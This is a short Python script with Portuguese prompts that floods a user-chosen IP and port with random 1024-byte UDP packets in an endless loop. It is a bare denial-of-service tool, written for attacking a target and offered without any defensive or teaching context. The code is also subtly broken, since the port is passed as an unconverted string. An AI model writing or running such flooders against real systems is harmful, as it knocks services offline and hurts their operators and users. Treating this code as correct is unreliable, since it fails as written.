import socket
import random 

ip = input("Escolha o IP para flodar: ")
port = input("Escolha a porta do " + ip + " que deseja flodar: ")

print("Flooding: ", ip + ":" + port)

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = random._urandom(1024)

while True:
    client.sendto(packet, (ip, port))
 
